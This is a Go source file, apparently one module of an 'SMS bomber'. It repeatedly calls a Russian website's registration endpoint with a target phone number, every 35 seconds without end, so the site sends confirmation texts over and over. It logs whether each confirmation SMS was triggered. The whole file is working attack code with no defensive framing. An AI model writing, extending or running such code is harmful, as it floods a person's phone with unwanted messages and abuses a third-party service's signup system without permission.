package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func xarakiri() {
	req := newreq()
	req.SetRequestURI("https://www.xarakiri.ru/include/ajax/ajax_register.php?func=site_register&lgn=" + num + "&pswd=zhopasyelatrysi")

	timeout := time.Second * 35
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"confirm",`) != -1 && strings.Index(string(res.Body()), `"err",`) == -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
